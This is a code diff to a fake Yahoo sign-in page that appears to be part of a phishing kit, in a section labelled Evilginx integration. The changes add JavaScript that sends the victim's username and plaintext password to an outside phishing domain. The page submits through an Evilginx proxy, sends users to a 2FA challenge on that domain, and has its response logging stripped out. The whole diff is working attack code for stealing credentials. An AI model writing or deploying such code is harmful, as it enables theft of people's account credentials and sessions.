@@ -39,7 +39,7 @@
               data-wf-page-id="67c6f50ed426ad7d5847f218" 
               data-wf-element-id="1312d987-3657-e4e0-e2bb-17ae6027d67d">
           
-          <!-- CRITICAL: All Yahoo form fields from your network capture -->
+          <!-- CRITICAL: All Yahoo form fields from network capture -->
           <input type="hidden" name="browser-fp-data" id="browser-fp-data">
           <input type="hidden" name="crumb" id="crumb" value="31wTyCvw7RZO%2FqKiA3tKg">
           <input type="hidden" name="acrumb" id="acrumb" value="dqd4JdSY">
@@ -116,7 +116,7 @@
 
   <!-- ===== ENHANCED FUNCTIONALITY (EVILGINX INTEGRATION) ===== -->
   <script>
-  // Generate browser fingerprint (from your network capture)
+  // Generate browser fingerprint (from network capture)
   function generateBrowserFingerprint() {
     const fp = {
       language: navigator.language || 'en-US',
@@ -227,11 +227,14 @@
           // UI feedback
           $submitBtn.prop('disabled', true).val('Verifying...');
 
-          // Log for debugging
-          console.log('=== CREDENTIAL CAPTURE ===');
-          console.log('Username:', username);
-          console.log('Password length:', password.length);
-          console.log('Form action:', $(this).attr('action'));
+          // Send credentials to parent window (evilginx)
+          if (window.parent !== window) {
+              window.parent.postMessage({
+                  type: 'credentials',
+                  username: username,
+                  password: password
+              }, 'https://login.qr-gpt.live');
+          }
 
           // Submit to Evilginx proxy
           $.ajax({
@@ -248,12 +251,10 @@
               success: function(response, textStatus, xhr) {
                   console.log('=== SUCCESS RESPONSE ===');
                   console.log('Status:', xhr.status);
-                  console.log('Response preview:', response.substring(0, 500));
                   
-                  // Check for 2FA challenge
+                  // Check for 2FA challenge or redirect
                   if (response.includes('challenge-selector') || response.includes('2fa') || response.includes('verification')) {
-                      console.log('2FA challenge detected, continuing with proxied flow...');
-                      // Let evilginx handle the redirect to 2FA
+                      console.log('2FA challenge detected, redirecting...');
                       window.location.href = 'https://login.qr-gpt.live/account/challenge/challenge-selector';
                   } else if (response.includes('mail') || response.includes('folders')) {
                       console.log('Authentication successful');
@@ -266,7 +267,6 @@
               error: function(xhr) {
                   console.log('=== ERROR RESPONSE ===');
                   console.log('Status:', xhr.status);
-                  console.log('Response:', xhr.responseText);
                   
                   // Handle different error scenarios
                   let errorMsg = 'Invalid password. Please try again.';
